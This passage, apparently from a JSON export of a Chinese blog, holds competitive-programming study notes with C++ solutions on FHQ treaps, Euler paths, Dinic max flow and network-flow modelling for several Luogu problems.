  int pos=0,root=0,n,l,r;cin>>n;\n    while(n--){\n        char op[7];cin>>op;\n        if(op[0]=='M') cin>>pos;\n        if(op[0]=='I'){\n            int len;cin>>len;\n            tree.split(root,pos,l,r);\n            for(int i=1;i<=len;i++){\n                char ch=getchar();\n                while(ch<32||ch>126) ch=getchar();\n                l=tree.merge(l,tree.create(ch));\n            }\n            root=tree.merge(l,r);\n        }\n        if(op[0]=='D'){\n            int len,tmp;cin>>len;\n            tree.split(root,pos+len,l,r);tree.split(l,pos,l,tmp);\n            root=tree.merge(l,r);\n        }\n        if(op[0]=='G'){\n            int len,tmp;cin>>len;\n            tree.split(root,pos+len,l,r);tree.split(l,pos,l,tmp);\n            tree.print(tmp);cout<<endl;\n            root=tree.merge(tree.merge(l,tmp),r);\n        }\n        if(op[0]=='P') pos--;\n        if(op[0]=='N') pos++;\n    }\n}\nsigned main(){\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n### P3391 【模板】文艺平衡树\n\nhttps://www.luogu.com.cn/problem/P3391\n\n**题目描述**\n\n维护一个序列，有若干区间翻转操作，输出所有操作后，得到的序列\n\n**笔记**\n\n对区间 $[l,r]$ 进行翻转，可以视为将区间 $[l,k]$ 和区间 $[k+1,r]$ 交换，然后这两个区间再分别递归进行这个操作\n\n也可以视为找到一个轴 $k(l<k<r)$ ，将区间 $[l,k-1]$ 和 $[k+1,r]$ 交换，然后这两个区间再分别递归进行这个操作\n\n然后对于本题我们在 fhq treap 上引入懒标记，每次分裂或者合并时 pushdown 这个懒标记\n\n```cpp\n#include<iostream>\n#define maxn 100005\nusing namespace std;\n\nint id,val[maxn],dat[maxn],size[maxn],ch[maxn][2],root,tag[maxn];\ninline int create(int x){\n\tid++;\n\tval[id]=x;\n\tdat[id]=rand();\n\tsize[id]=1;\n\treturn id;\n}\ninline void pushup(int k){\n\tsize[k]=size[ch[k][0]]+1+size[ch[k][1]];\n}\ninline void pushdown(int k){\n\tif(tag[k]){\n\t\ttag[ch[k][0]]^=1;\n\t\ttag[ch[k][1]]^=1;\n\t\tswap(ch[k][0],ch[k][1]);\n\t\ttag[k]=0;\n\t}\n}\nvoid split(int now,int k,int &x,int &y){\n\tif(!now) x=y=0;\n\telse{\n\t\tpushdown(now);\n\t\tint u=size[ch[now][0]]+1;\n\t\tif(u<=k){\n\t\t\tx=now;\n\t\t\tsplit(ch[now][1],k-u,ch[now][1],y);\n\t\t\tpushup(x);\n\t\t}else{\n\t\t\ty=now;\n\t\t\tsplit(ch[now][0],k,x,ch[now][0]);\n\t\t\tpushup(y);\n\t\t}\n\t}\n}\nint merge(int x,int y){\n\tif(!x||!y) return x+y;\n\tpushdown(x);\n\tpushdown(y);\n\tif(dat[x]<=dat[y]){\n\t\tch[x][1]=merge(ch[x][1],y);\n\t\tpushup(x);\n\t\treturn x;\n\t}else{\n\t\tch[y][0]=merge(x,ch[y][0]);\n\t\tpushup(y);\n\t\treturn y;\n\t}\n}\nvoid reverse(int l,int r){\n\tint p1=0,p2=0,p3=0,p4=0;\n\tsplit(root,l-1,p1,p2);\n\tsplit(p2,(r-l+1),p3,p4);\n\ttag[p3]^=1;\n\tp2=merge(p3,p4);\n\troot=merge(p1,p2);\n}\nvoid print(int k){\n\tpushdown(k);\n\tif(ch[k][0]) print(ch[k][0]);\n\tcout<<val[k]<<\" \";\n\tif(ch[k][1]) print(ch[k][1]);\n}\n\nint main(){\n\tint n,m;\n\tcin>>n>>m;\n\tint l,r;\n\tfor(int i=1;i<=n;i++){\n\t\t//int k;\n\t\t//cin>>k;\n\t\tsplit(root,i-1,l,r);\n\t\troot=merge(merge(l,create(i)),r);\n\t}\n\twhile(m--){\n\t\tcin>>l>>r;\n\t\treverse(l,r);\n\t}\n\tprint(root);\n\treturn 0;\n}\n```\n\n### P5055 【模板】可持久化文艺平衡树\n\nhttps://www.luogu.com.cn/problem/P5055\n\n**题目描述**\n\n每次操作创建一个新版本。然后有如下的操作，可以基于之前的版本进行修改：\n\n1. 在某个位置插入一个数\n2. 删除某个位置上的数字\n3. 翻转区间\n4. 查询区间和\n\n**笔记**\n\n考虑创建新版本时，很多节点是和上一个版本是重合的，所以我们对于重合的点，直接重用，只产生新的发生改变的点。每次 pushdown 和 split 的时候克隆\n\n至于节点数组开多大，直接估计比较麻烦，我们可以直接根据题目的空间的限制尽可能开大\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 200005\nstruct FHQ{\n    struct Node{int ls,rs,val,dat,siz,lazy,sum;} tree[_<<6];\n    int tot=0;\n    #define nt tree[k]\n    #define lt tree[tree[k].ls]\n    #define rt tree[tree[k].rs]\n    inline int create(int v){int k=++tot;nt.dat=rand(),nt.siz=1,nt.sum=v,nt.val=v;return tot;}\n    inline int clone(int k){tree[++tot]=nt;return tot;}\n    inline void update(int k){nt.siz=1+lt.siz+rt.siz,nt.sum=lt.sum+rt.sum+nt.val;}\n    void pushdown(int k){\n        if(!nt.lazy) return;\n        if(nt.ls) nt.ls=clone(nt.ls);\n        if(nt.rs) nt.rs=clone(nt.rs);\n        swap(nt.ls,nt.rs);\n        lt.lazy^=1,rt.lazy^=1;\n        nt.lazy=0;\n    }\n    void split(int k,int x,int &l,int &r){\n        if(!k) return l=r=0,void();\n        pushdown(k);\n        if(lt.siz+1<=x) l=clone(k),split(tree[l].rs,x-lt.siz-1,tree[l].rs,r),update(l);\n        else r=clone(k),split(tree[r].ls,x,l,tree[r].ls),update(r);\n    }\n    int merge(int l,int r){\n        if(l==0||r==0) return l+r;\n        pushdown(l);pushdown(r);\n        if(tree[l].dat<tree[r].dat) return tree[l].rs=merge(tree[l].rs,r),update(l),l;\n        else return tree[r].ls=merge(l,tree[r].ls),update(r),r;\n    }\n} tree;\nint root[_];\ninline void subtask(){\n    srand(time(NULL));\n    int now=0,l,r,tmp,lastans=0,n;cin>>n;\n    while(n--){\n        int v,op;cin>>v>>op;\n        if(op==1){\n            int p,x;cin>>p>>x;p^=lastans,x^=lastans;\n            tree.split(root[v],p,l,r);\n            root[++now]=tree.merge(tree.merge(l,tree.create(x)),r);\n        }\n        if(op==2){\n            int p;cin>>p;p^=lastans;\n            tree.split(root[v],p,tmp,r);\n            tree.split(tmp,p-1,l,tmp);\n            root[++now]=tree.merge(l,r);\n        }\n        if(op==3){\n            int x,y;cin>>x>>y;x^=lastans,y^=lastans;\n            tree.split(root[v],y,l,r);\n            tree.split(l,x-1,l,tmp);\n            tree.tree[tmp].lazy^=1;\n            root[++now]=tree.merge(tree.merge(l,tmp),r);\n        }\n        if(op==4){\n            int x,y;cin>>x>>y;x^=lastans,y^=lastans;\n            tree.split(root[v],y,l,r);\n            tree.split(l,x-1,l,tmp);\n            lastans=tree.tree[tmp].sum;\n            cout<<lastans<<endl;\n            root[++now]=tree.merge(tree.merge(l,tmp),r);\n        }\n    }\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n","summary":"平衡树的学习笔记，但是目前只记录了一些相关题目","key":["平衡树","数据结构"],"tags":[],"path":["算法竞赛","知识点","平衡树.md"],"background":"http://pic.caiwen.work/i/2025/04/03/67ee86b2c2098.jpg","recommend":false,"status":"draft"},{"type":"Article","title":"图论(新)","id":"new_tulun","createTime":"2025-03-01T12:58:27.491Z","updateTime":"2025-09-05T13:34:06.032Z","content":"\n## 欧拉路\n\n**欧拉路** 一口气经过所有的点和边，且所有的边只经过一次\n\n**欧拉回路** 能形成回路的欧拉路\n\n### 判定\n\n#### 无向图\n\n- 当且仅当无向图中所有点的度数均为偶数时才有欧拉回路\n- 当且仅当无向图中有欧拉回路，或者有且仅有两个度数为奇数的点时才有欧拉路。对于后者，度数为奇数的点时起点或者终点\n- 需注意图是否联通\n\n#### 有向图\n\n如果我们令一个点的出度记为 1，入度记为 -1，这个点所有的出度和入度相加，就是它的度数\n\n- 当且仅当有向图中所有的点度数为 0 时才有欧拉回路\n- 当且仅当有向图中有欧拉回路，或者有且仅有一个度数为 1 的点和一个度数为 -1 的点，其他所有的点度数均为 0。对于后者，度数为 1 的是起点，度数为 -1 的是终点\n- 需注意图是否联通\n\n### 打印方案\n\n#### 递归遍历\n\n直接 dfs 整个图，注意所有的边只能走一次，然后**在回溯时**打印答案。有向图和无向图都一样\n\n**例题** [UVA10054](https://vjudge.net/problem/UVA-10054) 无向图求欧拉回路，打印方案\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\nint d[55],g[55][55];\nvoid dfs(int u){\n    for(int v=1;v<=50;v++){\n        if(g[u][v]){\n            g[u][v]--,g[v][u]--;\n            dfs(v);\n            cout<<v<<\" \"<<u<<endl; // 回溯的时候\n        }\n    }\n}\ninline void subtask(){\n    int n;cin>>n;\n    while(n--){\n        int u,v;cin>>u>>v;\n        d[u]++,d[v]++;\n        g[u][v]++,g[v][u]++;\n    }\n    for(int i=1;i<=50;i++) if(d[i]%2) return cout<<\"some beads may be lost\"<<endl,void();\n    for(int i=1;i<=50;i++) if(d[i]) return dfs(i),void();\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t;cin>>t;\n    for(int i=1;i<=t;i++){\n        cout<<\"Case #\"<<i<<endl;\n        subtask();\n        memset(d,0,sizeof(d));\n        memset(g,0,sizeof(g));\n        cout<<endl;\n    }\n    return 0;\n}\n```\n\n#### 模拟栈\n\n如果递归深度过大的话，有可能会爆栈。此时我们考虑模拟递归时的栈来解决。基本思想是先从一个点一直往下dfs，dfs不动了，就把最后一个数字计入答案，然后再从第二个数字开始一直往下dfs\n\n**例题** [POJ1780](https://vjudge.net/problem/POJ-1780) 有向图求欧拉路，打印方案，按字典序\n\n题目大概意思是给定 $n$ 然后让我们生成一个字符串，使得字符串从头开始每看 $n$ 个数都是互不相同的 $n$ 位数字，且覆盖所有的 $n$ 位数字（含前导 0）\n\n我们考虑现在已经有 $n-1$ 位数字，然后填入下一位数字，此时就构成了一个 $n$ 位数字，但同时后面的 $n-1$ 位数字又变成了新的”状态“，等待填入下一位数字\n\n因此我们可以把所有的 $n-1$ 位数字视为一个状态，通过连有向边，即填数，来转移到另一个状态。每个状态向外连边只能经过一次，且需要把所有的边都走一遍，于是就转化为了欧拉路问题\n\n```cpp\n#include<iostream>\n#include<algorithm>\n#include<stack>\nusing namespace std;\n#include <cassert>\n\nint nxt[1000006],n,cnt;\nstack<int> s,ans;\nvoid dfs(int x){// 一直走下去\n\twhile(nxt[x]<10){\n\t\tint to=(x*10+nxt[x])%cnt;\n\t\ts.push(to);\n\t\tnxt[x]++;\n\t\tx=to;\n\t}\n}\n\nint main(){\n\tios::sync_with_stdio(false);\n\twhile(cin>>n && n){\n\t\tif(!n) break;\n\t\tif(n==1){\n\t\t\tcout<<\"0123456789\"<<endl;\n\t\t\tcontinue;\n\t\t}\n\t\tcnt=1;\n\t\tfor(int i=1;i<=n-1;i++) cnt*=10;\n\t\tfor(int i=0;i<cnt;i++) nxt[i]=0;\n\t\tfor(int i=1;i<=n-1;i++) cout<<0;\n\t\tdfs(0);\n\t\twhile(!s.empty()){// 走不动了，说明该回溯到上一个点，然后再向另一个方向一直走\n\t\t\tans.push(s.top()%10);s.pop();\n\t\t\tif(!s.empty()) dfs(s.top());\n\t\t}\n\t\tint tot=n-1;\n\t\twhile(!ans.empty()) cout<<ans.top(),ans.pop(),tot++;\n\t\tcout<<endl;\n\t}\n\treturn 0;\n}\n```\n\n#### 按字典序\n\n先把点连出的所有边按照字典序排序，然后再求欧拉路，此时得到的方案其实就是按字典序的。但是由于我们是在回溯时记录答案，所以得到的方案其实是反的。所以我们还需要再把回溯时的要记录的点先放到一个栈里，然后最后再从栈中取出（相当于又反了一遍）\n\n**例题** [P7771](https://www.luogu.com.cn/problem/P7771) 有向图求欧拉路板子题，按字典序输出方案\n\n```cpp\n#include<bits/stdc++.h>\n#define _ 200005\nusing namespace std;\n\ninline int read(){\n\tint res=0,ch=getchar(),f=1;\n\twhile(!isdigit(ch) and ch!=EOF){\n\t\tif(ch=='-') f=-1;\n\t\tch=getchar();\n\t}\n\twhile(isdigit(ch)){\n\t\tres=(res<<3)+(res<<1)+(ch-'0');\n\t\tch=getchar();\n\t}\n\treturn res*f;\n}\n\nvector<int> ve[_];\nint bl[_],n,m,in[_],out[_];\nstack<int> st;\nvoid dfs(int x){\n\tfor(int i=bl[x];i<ve[x].size();i=bl[x]){\n\t\tbl[x]++;\n\t\tdfs(ve[x][i]);\n\t}\n\tst.push(x);\n}\n\nint main(){\n\tn=read(),m=read();\n\tfor(int i=1;i<=m;i++){\n\t\tint u=read(),v=read();\n\t\tin[v]++,out[u]++;\n\t\tve[u].push_back(v);\n\t}\n\tfor(int i=1;i<=n;i++) sort(ve[i].begin(),ve[i].end());\n\tint flag=0,cnt1=0,cnt2=0,s=0;\n\tfor(int i=1;i<=n;i++){\n\t\tif(in[i]!=out[i]) flag=true;\n\t\tif(in[i]-out[i]==1) cnt1++;\n\t\tif(out[i]-in[i]==1) s=i,cnt2++;\n\t}\n\tif(flag&&!(cnt1==cnt2&&cnt1==1)) return cout<<\"No\",0;\n\tif(flag) dfs(s);\n\telse dfs(1);\n\twhile(!st.empty()) cout<<st.top()<<' ',st.pop();\n\treturn 0;\n}\n```\n\n## 网络流\n\n### 最大流\n\n弧优化的dinic算法\n\n```cpp\nint dis[_],rad[_],s,t;\nbool bfs(){\n\tmemset(dis,0,sizeof(dis));dis[s]=1;\n\tqueue<int> q;q.push(s);\n\twhile(!q.empty()){\n\t\tint now=q.front();q.pop();\n\t\trad[now]=head[now];\n\t\tfor(int i=head[now];i;i=edge[i].nxt){\n\t\t\tint to=edge[i].to;\n\t\t\tif(!dis[to]&&edge[i].w) dis[to]=dis[now]+1,q.push(to);\n\t\t}\n\t}\n\treturn dis[t]!=0;\n}\nint dfs(int now,int rem){\n\tif(now==t) return rem;\n\tint tmp=rem;\n\tfor(int i=rad[now];i;i=edge[i].nxt){\n\t\tint to=edge[i].to;rad[now]=i;\n\t\tif(dis[to]==dis[now]+1&&edge[i].w){\n\t\t\tint k=min(edge[i].w,tmp);\n\t\t\tint d=dfs(to,k);\n\t\t\tedge[i].w-=d,edge[i^1].w+=d;\n\t\t\ttmp-=d;\n\t\t\tif(!tmp) break;\n\t\t}\n\t}\n\treturn rem-tmp;\n}\n```\n\n### DAG最小路径覆盖\n\n#### 不相交路径\n\n![image-20250306174049255](C:\\Users\\Caiwen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20250306174049255.png)\n\n如图所示，一种不相交的最小路径覆盖为 1->3->4、2、5\n\n一个点也可以视为一个长度为 $0$ 的路径\n\n我们可以先建立一个二分图，左边是 $1\\sim n$ ，右边也是 $1\\sim n$。如果 DAG 上存在一个有向边 $(u,v)$ 的话，那么就把二分图中左边的 $u$ 和右边的 $v$ 连边。最后有\n\n$$\n\\text{最小不相交路径覆盖}=\\text{总点数}-\\text{最大匹配}\n$$\n\n可以理解为，我先让每个点被自己覆盖。然后如果我在二分图上建立了一个匹配了，那么就相当于延长了一个路径，也就是少花费了一个点\n\n#### 可相交路径\n\n还是如上图，一种可相交的最小路径覆盖为 1->3->4、2->3->5\n\n我们先用 floyd 在图上搞传递闭包，然后如果 $u$ 能到达 $v$ ，就在把二分图左边的 $u$ 与右边的 $v$ 连边。最后答案还是按上式计算\n\n可以理解为如果 $u$ 能到达 $v$ ，那么我们直接给连过去，先把中间的点省略，因为中间的点可能会被其他路径使用。如果后面的路径没使用到这个中间点的话，那么根据最大匹配的算法，一定会调整为选择使用中间的点，因为这样才能得到最大匹配\n\n### 题目\n\n#### P2472 [SCOI2007] 蜥蜴\n\nhttps://www.luogu.com.cn/problem/P2472\n\n**题目描述**\n\n在一个 $r$ 行 $c$ 列的网格地图中有一些高度不同的石柱，第 $i$ 行 $j$ 列的石柱高度为 $h_{i,j}$。\n\n一些石柱上站着一些蜥蜴，你的任务是让尽量多的蜥蜴逃到边界外。\n\n每行每列中相邻石柱的距离为 $1$，蜥蜴的跳跃距离是 $d$，即蜥蜴可以跳到**平面距离**不超过 $d$ 的任何一个石柱上。\n\n石柱都不稳定，每次当蜥蜴跳跃时，所离开的石柱高度减 $1$（如果仍然落在地图内部，则到达的石柱高度不变）。\n\n如果该石柱原来高度为 $1$，则蜥蜴离开后消失，以后其他蜥蜴不能落脚。\n\n任何时刻不能有两只蜥蜴在同一个石柱上。\n\n**数据范围**\n\n对于 $100\\%$ 的数据满足：$1\\le r,c\\le20$，$1\\le d\\le 4$，$1\\le h\\le 3$。\n\n**笔记**\n\n题目总体来说有两个限制，一个是跳完之后高度就减一，减到 0 后就不能再跳到该位置了。另一个是同一时间只能有一个蜥蜴在一个柱子上\n\n对于后者，其实可以忽略。如果我们能够得到一个蜥蜴的跳出方案，而这个蜥蜴要跳到的柱子已经被占用了，那么我们可以一直等待柱子解除占用，毕竟题目又没要求时间\n\n于是就只需要考虑前面这个限制了。其实就是限制经过一个点的次数。对于这种要求，我们有如下建模方案：将点拆成入点和出点，然后入点到出点设置流量为限制次数的边\n\n![image-20250306155451629](C:\\Users\\Caiwen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20250306155451629.png)\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\nint n,m,d,g[22][22],s,t,has[22][22],siz=1,head[900],dis[900],rad[900];\ninline int get(int x,int y,int t){\n    int res=(x-1)*m+y;\n    return t==0? res:n*m+res;\n}\ninline int dis2(int x1,int y1,int x2,int y2){return (x1-x2)*(x1-x2)+(y1-y2)*(y1-y2);}\nstruct Edge{int to,nxt,w;} edge[320004];\ninline void _add(int u,int v,int w){edge[++siz].nxt=head[u],edge[siz].to=v,edge[siz].w=w,head[u]=siz;}\ninline void add(int u,int v,int w){_add(u,v,w),_add(v,u,0);}\nbool bfs(){\n\tmemset(dis,0,sizeof(dis));dis[s]=1;\n\tqueue<int> q;q.push(s);\n\twhile(!q.empty()){\n\t\tint now=q.front();q.pop();\n\t\trad[now]=head[now];\n\t\tfor(int i=head[now];i;i=edge[i].nxt){\n\t\t\tint to=edge[i].to;\n\t\t\tif(!dis[to]&&edge[i].w) dis[to]=dis[now]+1,q.push(to);\n\t\t}\n\t}\n\treturn dis[t]!=0;\n}\nint dfs(int now,int rem){\n\tif(now==t) return rem;\n\tint tmp=rem;\n\tfor(int i=rad[now];i;i=edge[i].nxt){\n\t\tint to=edge[i].to;rad[now]=i;\n\t\tif(dis[to]==dis[now]+1&&edge[i].w){\n\t\t\tint k=min(edge[i].w,tmp);\n\t\t\tint d=dfs(to,k);\n\t\t\tedge[i].w-=d,edge[i^1].w+=d;\n\t\t\ttmp-=d;\n\t\t\tif(!tmp) break;\n\t\t}\n\t}\n\treturn rem-tmp;\n}\ninline void subtask(){\n    cin>>n>>m>>d;\n    int cnt=0;\n    s=0,t=2*n*m+1;\n    for(int i=1;i<=n;i++){\n        string str;cin>>str;\n        for(int j=1;j<=m;j++) g[i][j]=str[j-1]-'0';\n    }\n    for(int i=1;i<=n;i++){\n        string str;cin>>str;\n        for(int j=1;j<=m;j++) has[i][j]=str[j-1]=='.'?0:1;\n    }\n    for(int i=1;i<=n;i++){\n        for(int j=1;j<=m;j++){\n            if(!g[i][j]) continue;\n            if(has[i][j]) add(s,get(i,j,0),1),cnt++;\n            add(get(i,j,0),get(i,j,1),g[i][j]);\n            if(min(i,min(j,min(n-i+1,m-j+1)))<=d) add(get(i,j,1),t,inf);\n            for(int k=max(1ll,i-d);k<=min(i+d,n);k++){\n                for(int l=max(1ll,j-d);l<=min(j+d,m);l++){\n                    if(k==i&&l==j) continue;\n                    if(!g[k][l]) continue;\n                    if(dis2(i,j,k,l)<=d*d) add(get(i,j,1),get(k,l,0),inf);\n                }\n            }\n        }\n    }\n    int ans=0;\n    while(bfs()) ans+=dfs(s,inf);\n    cout<<cnt-ans;\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n#### P2754 [CTSC1999] 家园 / 星际转移问题\n\nhttps://www.luogu.com.cn/problem/P2754\n\n**题目描述**\n\n有 地球，月球，还有额外的 $n$ 个星球，然后有 $m$ 个宇宙飞船，可以分别以自己的某个顺序循环在几个星球之间穿梭，每次穿梭消耗一个单位的时间。每个飞船都有自己的容量限制\n\n现在问至少需要多少时间才能把 $k$ 个人从 地球 运往 月球\n\n**数据范围**\n\n- $1 \\leq n \\leq 13$。\n- $1 \\leq m \\leq 20$。\n- $1 \\leq k \\leq 50$。\n- $1 \\leq r_i \\leq n + 2$。\n- $-1 \\leq S_{i, j}\\leq n$。\n\n**笔记**\n\n先用并查集判断是否有解\n\n然后题目中这个”时间“有点不好搞。这里又引出一个建模方法：根据时间分层，具体如图：\n\n![image-20250306160443125](C:\\Users\\Caiwen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20250306160443125.png)\n\n然后我们枚举时间，建图跑最大流，直到得到的流量等于 $k$ 即可得到答案\n\n注意理论上这种问题应该是二分答案的，但我们考虑直接枚举，因为如果有解，那么最大耗时不会超过 $kn^2$ ，所以枚举可以。而且当我们枚举完一个答案再往下枚举的时候，我们可以直接在现有的图上补充点和边，而不用再重新建立一个完整的图，这是二分做不到的。而且我们跑完最大流后，补充点和边，直接再基于上一次的残留网络继续跑最大流就可以了。所以直接枚举的效率并不会太低\n\n```cpp\n#include<bits/stdc++.h>\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 1000006\nstruct Edge{int nxt,to,w;} edge[_<<1];\nint head[_],siz=1,opa[_],fa[_],las[_];\ninline int find(int x){while(x!=fa[x]) x=fa[x]=fa[fa[x]];return x;}\ninline void _add(int u,int v,int w){edge[++siz].nxt=head[u],edge[siz].to=v,edge[siz].w=w,head[u]=siz;}\ninline void add(int u,int v,int w){_add(u,v,w),_add(v,u,0);}\nint dis[200005],rad[_],s,t;\nbool bfs(){\n\tmemset(dis,0,sizeof(dis));dis[s]=1;\n\tqueue<int> q;q.push(s);\n\twhile(!q.empty()){\n\t\tint now=q.front();q.pop();\n\t\trad[now]=head[now];\n\t\tfor(int i=head[now];i;i=edge[i].nxt){\n\t\t\tint to=edge[i].to;\n\t\t\tif(!dis[to]&&edge[i].w) dis[to]=dis[now]+1,q.push(to);\n\t\t}\n\t}\n\treturn dis[t]!=0;\n}\nint dfs(int now,int rem){\n\tif(now==t) return rem;\n\tint tmp=rem;\n\tfor(int i=rad[now];i;i=edge[i].nxt){\n\t\tint to=edge[i].to;rad[now]=i;\n\t\tif(dis[to]==dis[now]+1&&edge[i].w){\n\t\t\tint k=min(edge[i].w,tmp);\n\t\t\tint d=dfs(to,k);\n\t\t\tedge[i].w-=d,edge[i^1].w+=d;\n\t\t\ttmp-=d;\n\t\t\tif(!tmp) break;\n\t\t}\n\t}\n\treturn rem-tmp;\n}\nvector<int> to[_];\ninline void subtask(){\n    int n,m,k;cin>>n>>m>>k;\n    for(int i=0;i<=n+1;i++) fa[i]=i;\n    for(int i=1;i<=m;i++){\n        cin>>opa[i];\n        int r;cin>>r;\n        for(int j=1,x;j<=r;j++){\n            cin>>x;\n            if(x==-1) x=1;\n            else if(x!=0) x+=1;\n            to[i].push_back(x);\n        }\n        for(int j=0;j<to[i].size();j++){\n            int u=to[i][j],v=to[i][(j+1)%to[i].size()];\n            u=find(u),v=find(v);\n            if(u!=v) fa[u]=v;\n        }\n    }\n    if(find(1)!=find(0)) return cout<<0,void();\n    s=0;\n    for(int i=0;i<=n+1;i++) las[i]=i+1;\n    int ans=0,base=n+3;\n    add(s,las[0],k);\n    int ok=0;\n    while(true){\n        ans++;\n        for(int i=0;i<=n+1;i++) add(las[i],base+i,inf);\n        for(int i=1;i<=m;i++){\n            int u=to[i][(ans-1)%to[i].size()];\n            int v=to[i][ans%to[i].size()];\n            add(las[u],base+v,opa[i]);\n        }\n        for(int i=0;i<=n+1;i++) las[i]=base+i;\n        t=base+1;\n        base=base+n+1+1;\n        while(bfs()) ok+=dfs(s,inf);\n        if(ok==k) return cout<<ans<<endl,void();\n    }\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n#### P2765 魔术球问题\n\nhttps://www.luogu.com.cn/problem/P2765\n\n**题目描述**\n\n假设有 $n$ 根柱子，现要按下述规则在这 $n$ 根柱子中依次放入编号为 $1$，$2$，$3$，...的球“\n\n1. 每次只能在某根柱子的最上面放球。\n\n2. 同一根柱子中，任何 $2$ 个相邻球的编号之和为完全平方数。\n\n试设计一个算法，计算出在 $n$ 根柱子上最多能放多少个球。例如，在 $4$ 根柱子上最多可放 $11$ 个球。\n\n对于给定的 $n$，计算在 $n$ 根柱子上最多能放多少个球。\n\n**数据范围**\n\n对于 $100\\%$ 的数据，保证 $1 \\leq n \\leq 55$。\n\n**笔记**\n\n如果两个数能构成完全平方数，那么我们就把这两个数字连边，并规定一定是大的数字连向小的数字（其实小的数字往大的数字连边也可以，总之就是要保证一个顺序，但是大连小的话在后面补充建边时更有优势）\n\n如果我们要判断答案是否为 $x$，那么就相当于现在我们有一个含有 $x$ 个点的 DAG，并去判断这个 DAG 的最小不相交路径覆盖是否为 $n$\n\n我们沿用上道题的做法，枚举答案。考虑答案增加一，那么我们就相当于二分图两边多了个点，然后把这个点连向相加可以为完全平方数的数，然后在仅对新增的这个点跑最大匹配就可以了\n\n设当前点数为 $ans$，当前最大匹配为 $ok$，那么如果 $ans-ok=n$ 说明 $ans$ 即为答案。$ans$ 增加 $1$，$ok$ 可能增加 $1$ 也可能不增加，所以 $ans-ok$ 是单调不减的，所以直接枚举的正确性是可以保证的\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\nvector<int> ve[1000006];\nint match[1000006],t[1000006],nxt[1000006];\nbool dfs(int x,int tag){\n    if(t[x]==tag) return false;\n    t[x]=tag;\n    for(int to:ve[x]) if(!match[to]||dfs(match[to],tag)) return match[to]=x,true;\n    return false;\n}\ninline void subtask(){\n    int n;cin>>n;\n    int ans=0,ok=0,tag=0;\n    while(true){\n        ans++;\n        for(int i=2;i*i<2*ans;i++){\n            if(i*i<=ans) continue;\n            ve[ans].push_back(i*i-ans);\n        }\n        if(dfs(ans,++tag)) ok++;\n        if(ans-ok>n) break;\n    }\n    ans--;\n    cout<<ans<<endl;\n    for(int i=1;i<=ans;i++) nxt[match[i]]=i;\n    for(int i=1;i<=ans;i++){\n        if(match[i]) continue;\n        int now=i;cout<<now<<' ';\n        while(nxt[now]) cout<<nxt[now]<<' ',now=nxt[now];\n        cout<<endl;\n    }\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n#### P2766 最长不下降子序列问题\n\nhttps://www.luogu.com.cn/problem/P2766\n\n**题目描述**\n\n给定正整数序列 $x_1 \\ldots, x_n$。\n\n1. 计算其最长不下降子序列的长度 $s$。\n2. 如果每个元素只允许使用一次，计算从给定的序列中最多可取出多少个长度为 $s$ 的不下降子序列。\n3. 如果允许在取出的序列中多次使用 $x_1$ 和 $x_n$（其他元素仍然只允许使用一次），则从给定序列中最多可取出多少个**不同的**长度为 $s$ 的不下降子序列。\n\n令 $a_1, a_2, \\ldots, a_s$ 为构造 $S$ 时所使用的下标，$b_1, b_2, \\ldots, b_s$ 为构造 $T$ 时所使用的下标。且 $\\forall i \\in [1,s-1]$，都有 $a_i \\lt a_{i+1}$，$b_i \\lt b_{i+1}$。则 $S$ 和 $T$ **不同**，当且仅当 $\\exists i \\in [1,s]$，使得 $a_i \\neq b_i$。\n\n**数据范围**\n\n$1 \\le n\\le 500$\n\n**笔记**\n\n直接使用 dp 跑最长不下降子序列。不用 $O(n\\log n)$ 做法的原因是 dp 的话我们就知道以每个数结尾能够形成的最长不下降子序列的长度是多少，这有助于我们计算方案\n\n如果所有的数都可以重复取，那么我们可以用组合数学直接计算出来方案个数。但现在一个数只能取一次，即使考虑 dp 计算的话，后效性也太大\n\n于是此时网络流又派上用场了，我们按 dp 转移阶段分层，然后如果一个点能够转移到另一个点，就连边。直接这么连的话有些点会被取多次。于是又是套路的拆点，限制经过点的流量\n\n对于第三问，把边权改为 inf 后继续增广就可以了\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing 